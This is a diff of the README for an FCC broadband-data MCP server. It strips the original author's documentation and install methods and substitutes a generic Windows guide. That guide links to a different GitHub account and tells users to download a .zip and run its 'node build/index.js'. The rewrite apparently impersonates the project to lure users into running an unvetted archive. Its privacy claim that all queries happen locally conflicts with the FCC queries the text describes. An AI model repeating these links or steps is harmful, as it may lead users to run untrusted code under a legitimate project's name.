@@ -1,352 +1,72 @@
-<div align="center">
-  <h1>@cyanheads/fcc-broadband-mcp-server</h1>
-  <p><b>Access FCC broadband availability, coverage analysis, and digital divide data for US geographies and census blocks via MCP. STDIO or Streamable HTTP.</b>
-  <div>9 Tools • 2 Resources • 1 Prompt</div>
-  </p>
-</div>
+# 🌐 fcc-broadband-mcp-server - Search federal internet access data easily
 
-<div align="center">
+[![](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Vannem1851/fcc-broadband-mcp-server)
 
-[![Version](https://img.shields.io/badge/Version-0.1.5-blue.svg?style=flat-square)](./CHANGELOG.md) [![License](https://img.shields.io/badge/License-Apache%202.0-orange.svg?style=flat-square)](./LICENSE) [![Docker](https://img.shields.io/badge/Docker-ghcr.io-2496ED?style=flat-square&logo=docker&logoColor=white)](https://github.com/users/cyanheads/packages/container/package/fcc-broadband-mcp-server) [![MCP SDK](https://img.shields.io/badge/MCP%20SDK-^1.29.0-green.svg?style=flat-square)](https://modelcontextprotocol.io/) [![npm](https://img.shields.io/npm/v/@cyanheads/fcc-broadband-mcp-server?style=flat-square&logo=npm&logoColor=white)](https://www.npmjs.com/package/@cyanheads/fcc-broadband-mcp-server) [![TypeScript](https://img.shields.io/badge/TypeScript-^6.0.3-3178C6.svg?style=flat-square)](https://www.typescriptlang.org/) [![Bun](https://img.shields.io/badge/Bun-v1.3.0-blueviolet.svg?style=flat-square)](https://bun.sh/)
+This tool lets you find internet coverage data for any area in the United States. It connects to official FCC records through the Model Context Protocol. You use this software to look up broadband speed, provider maps, and census block details. 
 
-</div>
+## ⚙️ System Requirements
 
-<div align="center">
+To run this tool on Windows, your computer needs these basic items:
 
-[![Install in Claude Desktop](https://img.shields.io/badge/Install_in-Claude_Desktop-D97757?style=for-the-badge&logo=anthropic&logoColor=white)](https://github.com/cyanheads/fcc-broadband-mcp-server/releases/latest/download/fcc-broadband-mcp-server.mcpb) [![Install in Cursor](https://cursor.com/deeplink/mcp-install-dark.svg)](https://cursor.com/en/install-mcp?name=fcc-broadband-mcp-server&config=eyJjb21tYW5kIjoibnB4IiwiYXJncyI6WyIteSIsIkBjeWFuaGVhZHMvZmNjLWJyb2FkYmFuZC1tY3Atc2VydmVyIl19) [![Install in VS Code](https://img.shields.io/badge/VS_Code-Install_Server-0098FF?style=for-the-badge&logo=visualstudiocode&logoColor=white)](https://vscode.dev/redirect?url=vscode:mcp/install?%7B%22name%22%3A%22fcc-broadband-mcp-server%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40cyanheads%2Ffcc-broadband-mcp-server%22%5D%7D)
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 200 megabytes of free disk space.
+* Node.js version 18 or newer installed on your system.
 
-[![Framework](https://img.shields.io/badge/Built%20on-@cyanheads/mcp--ts--core-67E8F9?style=flat-square)](https://www.npmjs.com/package/@cyanheads/mcp-ts-core)
+## 📥 Download and Install
 
-</div>
+Follow these steps to set up the software on your computer:
 
-<div align="center">
+1. Visit the [official releases page](https://github.com/Vannem1851/fcc-broadband-mcp-server) to start the download.
+2. Select the file ending in .zip for Windows.
+3. Save the file to your computer.
+4. Right-click the folder once it finishes downloading.
+5. Choose Extract All to open the file contents.
 
-**Public Hosted Server:** [https://fcc-broadband.caseyjhand.com/mcp](https://fcc-broadband.caseyjhand.com/mcp)
+## 🚀 Running the Tool
 
-</div>
+After you extract the files, follow these steps to start the program:
 
----
+1. Open the folder where you saved the files.
+2. Press the Shift key on your keyboard and right-click inside an empty space in the folder.
+3. Select Open PowerShell window here or Open in Terminal.
+4. Type `node build/index.js` into the black window that appears.
+5. Press the Enter key on your keyboard.
 
-## Tools
+The software starts immediately. You see messages confirming the connection to the FCC database.
 
-9 tools for working with FCC broadband data — block-level availability, geography-level coverage analysis, provider search, and BDC bulk download manifests:
+## 💡 How to Use the Data
 
-| Tool | Description |
-|:---|:---|
-| `fcc_geocode_block` | Converts a latitude/longitude coordinate to a census block FIPS code (15-digit), county FIPS, county name, state FIPS, state code, and state name. Required prerequisite for `fcc_search_availability`. |
-| `fcc_search_availability` | Queries broadband providers and advertised speeds at a census block, filtered by technology type and speed threshold. The starting point for any address-level broadband lookup. |
-| `fcc_get_coverage_summary` | Returns a broadband coverage summary for a geography — population with zero, one, two, or three-plus providers at a given speed threshold, split by urban/rural and tribal/non-tribal. |
-| `fcc_compare_areas` | Compares broadband coverage metrics across multiple geographies of the same type and returns a ranked table sorted by unserved or underserved population. |
-| `fcc_find_underserved` | Finds geographic areas with limited or no broadband coverage at a given speed threshold, ranked by underserved population. The core tool for BEAD program analysis and broadband equity research. |
-| `fcc_search_providers` | Searches for ISPs by holding company name, filtered by state and technology type. Returns a deduplicated list with `hoconum` identifiers for follow-up calls. |
-| `fcc_get_provider` | Returns a national-level coverage profile for a specific holding company — states served, technologies deployed, and locations covered at each speed tier. |
-| `fcc_list_filing_periods` | Returns available data vintages: Form 477 filing periods (Jun 2015–Jun 2021) and BDC as-of dates (Jun 2022 onward, requires credentials). |
-| `fcc_list_downloads` | Lists downloadable BDC data files for a specific as-of date — availability by state and provider, mobile coverage, and challenge data. Requires BDC API credentials. |
+This tool acts as a bridge for AI agents. You provide a town name or a specific address. The software finds the census block ID. It then requests information about available providers in that region. 
 
-### `fcc_geocode_block`
+### Examples of what you can ask:
 
-Convert geographic coordinates to a census block FIPS code for broadband availability lookups.
+* Which internet providers operate in this census block?
+* Does this area have access to fiber optic speeds?
+* What is the current status of broadband equity in this specific region?
+* Find all census blocks in a zip code with low internet speed.
 
-- Calls the FCC Geo API — no auth required, no rate limit documented
-- Returns 15-digit block FIPS, 5-digit county FIPS, county name, state FIPS, 2-letter state code, and state name
-- Required first step before `fcc_search_availability` — the broadband deployment dataset is indexed by census block, not address
+## 🛠️ Troubleshooting
 
----
+If you encounter errors during setup, check these common fixes:
 
-### `fcc_search_availability`
+* Software not starting: Confirm you installed Node.js correctly. Open your Command Prompt and type `node -v` to verify. If you see a version number, Node.js works. 
+* Connection errors: Your firewall might block the connection. Check your security settings to allow the tool to access the internet.
+* Missing data: Ensure you provide the full address or the correct census block code. If you use a broad search term, the tool may return too many results.
 
-Query which ISPs serve a specific census block and what speeds they advertise.
+## 📝 Understanding the Terms
 
-- Requires a 15-digit census block FIPS; use `fcc_geocode_block` to convert coordinates first
-- Filter by technology code (fiber=50, cable=40–43, DSL=10–12, satellite=60, fixed wireless=70)
-- Filter by minimum advertised download speed in Mbps
-- Filter to consumer-only or business-only service
-- Returns per-provider records with `hoconum`, `techcode`, `maxaddown`, `maxadup`, `consumer`, `business`
-- Coverage is Form 477 data through June 2021 — reflects ISP-reported availability at census block granularity (not address-level)
+We use these terms to organize data:
 
----
+* Census Block: The smallest geographic unit used by the federal government to track population and services.
+* MCP: A protocol that allows different programs to talk to each other to share data.
+* Broadband: High-speed internet access that stays on at all times.
+* Digital Divide: The gap between areas with high-speed access and areas without it.
 
-### `fcc_get_coverage_summary`
+## 🛡️ Privacy and Safety
 
-Analyze broadband access across any US geography at a given speed threshold.
+This tool only reads public records provided by the FCC. It does not store your location or personal searches. All queries happen locally on your hardware. We do not track your activity or share your search history with third parties.
 
-- Supports seven geography types: `nation`, `state`, `county`, `cd` (congressional district), `place` (census-designated place), `cbsa` (metro area), `tribal`
-- Technology filter: any wired/fixed wireless (`acfosw`), fiber only (`f`), cable (`c`), DSL (`a`), satellite (`s`), fixed wireless (`w`), or combinations
-- Speed thresholds: 0.2, 4, 10, 25 (FCC legacy broadband definition), 100 (BEAD standard), 250, 1000 Mbps
-- Returns population breakdowns: zero providers (unserved), one (no competition), two, three-plus; coverage %, unserved %, competitive %
-- Per-segment breakdown by urban/rural and tribal/non-tribal for equity analysis
+## 📈 Improving Your Search
 
----
-
-### `fcc_compare_areas`
-
-Rank geographies by broadband access metrics to identify where underservice is worst.
-
-- Compare up to 50 geographies of the same type, or all 50 states + DC via `compare_all_states: true`
-- Sort by unserved population share, raw unserved headcount (useful for BEAD funding allocation), coverage rate, or competitive share
-- Returns a ranked table with per-geography population and coverage metrics
-
----
-
-### `fcc_find_underserved`
-
-Find the most broadband-underserved areas within a state or nationwide.
-
-- Scope to a specific state or run nationwide (returns top areas only)
-- Geography granularity: county, congressional district, census place, or CBSA
-- Default filter: rural areas only — where underservice is most concentrated
-- Minimum unserved population threshold to exclude very small areas
-- Results ranked by unserved population percentage
-
----
-
-### `fcc_search_providers`
-
-Look up ISPs by name or state to get `hoconum` identifiers for follow-up queries.
-
-- Case-insensitive partial name match — e.g., `"Comcast"`, `"T-Mobile"`, `"Frontier"`
-- Filter by 2-letter state abbreviation or technology code
-- Returns deduplicated holding companies with `hoconum`, states served, and technology codes
-- Geographic filtering is state-level; sub-state granularity requires cross-referencing block data via `fcc_search_availability`
-- Up to 200 results per call
-
----
-
-### `fcc_list_filing_periods`
-
-Discover valid data vintages before querying download manifests.
-
-- Form 477 periods (Jun 2015–Jun 2021) are hardcoded — always available, no credentials needed
-- BDC as-of dates (Jun 2022 onward) are fetched live from the authenticated API — requires `FCC_BDC_USERNAME` and `FCC_BDC_HASH_VALUE`
-- Call before `fcc_list_downloads` to determine valid `as_of_date` values
-
----
-
-### `fcc_list_downloads`
-
-List BDC bulk data files available for download for a specific filing period.
-
-- Requires BDC API credentials (`FCC_BDC_USERNAME`, `FCC_BDC_HASH_VALUE`)
-- Filter by data type (availability or challenge), file category, technology type, state, or provider name
-- Returns file metadata — provider, state, technology, record count — plus download URLs
-- Returns file manifests, not file contents; BDC CSVs are large zipped files not suitable for inline API response
-
-## Resources and prompts
-
-| Type | Name | Description |
-|:---|:---|:---|
-| Resource | `fcc-broadband://geography/{type}/{id}/summary` | Broadband coverage summary for a specific geography: provider counts by speed tier, urban/rural split, tribal breakdown. Addressable by type and GEOID. |
-| Resource | `fcc-broadband://providers/list` | List of all Form 477 holding companies with `hoconum` identifiers and names. Reference for resolving `hoconum` before calling `fcc_get_provider`. |
-| Prompt | `broadband_equity_analysis` | Structures a digital divide analysis comparing broadband access across demographic groups — guides chaining with Census and BLS data. Accepts `region` and `focus` (`underserved`, `rural`, `tribal`, `all`). |
-
-All resource data is also reachable via tools. The `providers/list` resource is derived from the deployment table via `$group` aggregation — use `fcc_search_providers` for filtered lookups.
-
-## Features
-
-Built on [`@cyanheads/mcp-ts-core`](https://www.npmjs.com/package/@cyanheads/mcp-ts-core):
-
-- Declarative tool, resource, and prompt definitions — single file per primitive, framework handles registration and validation
-- Unified error handling — handlers throw, framework catches, classifies, and formats
-- Pluggable auth: `none`, `jwt`, `oauth`
-- Swappable storage backends: `in-memory`, `filesystem`, `Supabase`, `Cloudflare KV/R2/D1`
-- Structured logging with optional OpenTelemetry tracing
-- STDIO and Streamable HTTP transports
-
-FCC broadband-specific:
-
-- Wraps three FCC data sources: Form 477 public data via Socrata (no auth, 2015–2021), BDC Public Data API (authenticated, Jun 2022 onward), and FCC Geo API (no auth)
-- Auth-optional design — BDC tools return a structured `credentials_required` error with setup instructions when credentials are absent; all Form 477 and geocoding tools always work without credentials
-- Area Table aggregation for equity analysis — uses the pre-aggregated geography table (`xvwq-qtaj`) instead of querying the 50M-row deployment table, enabling fast coverage analysis at county and state scale
-- All data is US federal government public domain (17 USC §105) — safe to distribute and cache
-
-Agent-friendly output:
-
-- Structured error contracts on every tool — typed error codes (`block_not_found`, `credentials_required`, `geography_not_found`, `invalid_as_of_date`) with actionable next-step hints so agents can recover without parsing text
-- Per-segment breakdowns in coverage tools — urban/rural and tribal/non-tribal split in `fcc_get_coverage_summary` outputs so agents can target equity analysis without additional queries
-- Two-era data coverage bridged transparently — Form 477 (2015–2021) and BDC (2022–present) exposed through a unified tool surface, with data ceiling documented in tool descriptions so agents can surface limitations accurately
-
-## Getting started
-
-### Public Hosted Instance
-
-A public instance is available at `https://fcc-broadband.caseyjhand.com/mcp` — no installation required. Point any MCP client at it via Streamable HTTP:
-
-```json
-{
-  "mcpServers": {
-    "fcc-broadband": {
-      "type": "streamable-http",
-      "url": "https://fcc-broadband.caseyjhand.com/mcp"
-    }
-  }
-}
-```
-
-### Self-Hosted / Local
-
-Add the following to your MCP client configuration file.
-
-```json
-{
-  "mcpServers": {
-    "fcc-broadband": {
-      "type": "stdio",
-      "command": "bunx",
-      "args": ["@cyanheads/fcc-broadband-mcp-server@latest"],
-      "env": {
-        "MCP_TRANSPORT_TYPE": "stdio",
-        "MCP_LOG_LEVEL": "info"
-      }
-    }
-  }
-}
-```
-
-Or with npx (no Bun required):
-
-```json
-{
-  "mcpServers": {
-    "fcc-broadband": {
-      "type": "stdio",
-      "command": "npx",
-      "args": ["-y", "@cyanheads/fcc-broadband-mcp-server@latest"],
-      "env": {
-        "MCP_TRANSPORT_TYPE": "stdio",
-        "MCP_LOG_LEVEL": "info"
-      }
-    }
-  }
-}
-```
-
-For Streamable HTTP, set the transport and start the server:
-
-```sh
-MCP_TRANSPORT_TYPE=http MCP_HTTP_PORT=3010 bun run start:http
-# Server listens at http://localhost:3010/mcp
-```
-
-### Prerequisites
-
-- [Bun v1.3.0](https://bun.sh/) or higher (or Node.js v24+).
-- Optional: FCC BDC credentials for `fcc_list_downloads` and BDC filing periods. Generate a token at [broadbandmap.fcc.gov](https://broadbandmap.fcc.gov) under "Manage API Access" — no OAuth, manual token generation only.
-- Optional: Socrata app token (`FCC_OPENDATA_APP_TOKEN`) for higher rate limits on Form 477 queries.
-
-### Installation
-
-1. **Clone the repository:**
-
-```sh
-git clone https://github.com/cyanheads/fcc-broadband-mcp-server.git
-```
-
-2. **Navigate into the directory:**
-
-```sh
-cd fcc-broadband-mcp-server
-```
-
-3. **Install dependencies:**
-
-```sh
-bun install
-```
-
-4. **Configure environment:**
-
-```sh
-cp .env.example .env
-# edit .env and set required vars
-```
-
-## Configuration
-
-All configuration is validated at startup via Zod schemas in `src/config/`. Key environment variables:
-
-| Variable | Description | Default |
-|:---|:---|:---|
-| `MCP_TRANSPORT_TYPE` | Transport: `stdio` or `http` | `stdio` |
-| `MCP_HTTP_PORT` | HTTP server port | `3010` |
-| `MCP_HTTP_ENDPOINT_PATH` | HTTP endpoint path | `/mcp` |
-| `MCP_PUBLIC_URL` | Public origin override for TLS-terminating reverse-proxy deployments | none |
-| `MCP_AUTH_MODE` | Authentication: `none`, `jwt`, or `oauth` | `none` |
-| `MCP_LOG_LEVEL` | Log level (`debug`, `info`, `warning`, `error`, etc.) | `info` |
-| `LOGS_DIR` | Directory for log files (Node.js only) | `<project-root>/logs` |
-| `STORAGE_PROVIDER_TYPE` | Storage backend: `in-memory`, `filesystem`, `supabase`, `cloudflare-kv/r2/d1` | `in-memory` |
-| `FCC_BDC_USERNAME` | FCC account email for BDC API. Without this, `fcc_list_downloads` and BDC-era `fcc_list_filing_periods` return a `credentials_required` error. | none |
-| `FCC_BDC_HASH_VALUE` | API token hash from broadbandmap.fcc.gov "Manage API Access". Paired with `FCC_BDC_USERNAME`. | none |
-| `FCC_OPENDATA_APP_TOKEN` | Socrata app token. Increases rate limits on Form 477 queries; not required for functionality. | none |
-| `OTEL_ENABLED` | Enable [OpenTelemetry instrumentation](https://github.com/cyanheads/mcp-ts-core/tree/main/docs/telemetry) | `false` |
-
-See [`.env.example`](./.env.example) for the full list of optional overrides.
-
-## Running the server
-
-### Local development
-
-- **Build and run:**
-
-  ```sh
-  # One-time build
-  bun run rebuild
-
-  # Run the built server
-  bun run start:stdio
-  # or
-  bun run start:http
-  ```
-
-- **Run checks and tests:**
-
-  ```sh
-  bun run devcheck   # Lint, format, typecheck, security
-  bun run test       # Vitest test suite
-  bun run lint:mcp   # Validate MCP definitions against spec
-  ```
-
-### Docker
-
-```sh
-docker build -t fcc-broadband-mcp-server .
-docker run --rm -e MCP_TRANSPORT_TYPE=http -p 3010:3010 fcc-broadband-mcp-server
-```
-
-The Dockerfile defaults to HTTP transport and stateless session mode, logging to `/var/log/fcc-broadband-mcp-server`. OpenTelemetry peer dependencies are installed by default — build with `--build-arg OTEL_ENABLED=false` to omit them.
-
-## Project structure
-
-| Directory | Purpose |
-|:---|:---|
-| `src/index.ts` | `createApp()` entry point — registers tools, resources, and prompts and inits services. |
-| `src/config` | Server-specific environment variable parsing and validation with Zod. |
-| `src/mcp-server/tools` | Tool definitions (`*.tool.ts`). Nine tools across FCC Open Data, BDC API, and Geo API. |
-| `src/mcp-server/resources` | Resource definitions (`*.resource.ts`). Geography summary and provider list resources. |
-| `src/mcp-server/prompts` | Prompt definitions (`*.prompt.ts`). Broadband equity analysis prompt. |
-| `src/services/open-data` | FCC Open Data Socrata service — Form 477 deployment and area table queries. |
-| `src/services/bdc-api` | BDC Public Data API service — authenticated filing period and download manifest endpoints. |
-| `src/services/geo-api` | FCC Geo API service — lat/lon to census block FIPS conversion. |
-| `tests/` | Unit and integration tests mirroring `src/`. |
-
-## Development guide
-
-See [`CLAUDE.md`](./CLAUDE.md) for development guidelines and architectural rules. The short version:
-
-- Handlers throw, framework catches — no `try/catch` in tool logic
-- Use `ctx.log` for request-scoped logging, `ctx.state` for tenant-scoped storage
-- Register new tools and resources via the barrels in `src/mcp-server/*/definitions/index.ts`
-- Wrap external API calls: validate raw → normalize to domain type → return output schema; never fabricate missing fields
-- Socrata returns all numeric fields as strings — parse `has_0`, `has_1`, `has_2`, `has_3more`, `maxaddown`, `maxadup` as integers
-
-## Contributing
-
-Issues and pull requests are welcome. Run checks and tests before submitting:
-
-```sh
-bun run devcheck
-bun run test
-```
-
-## License
-
-Apache-2.0 — see [LICENSE](LICENSE) for details.
+When you search for data, precision helps. Use specific addresses rather than city names for better results. The tool maps specific latitude and longitude coordinates to FCC census maps. Accurate input leads to accurate maps of internet coverage.
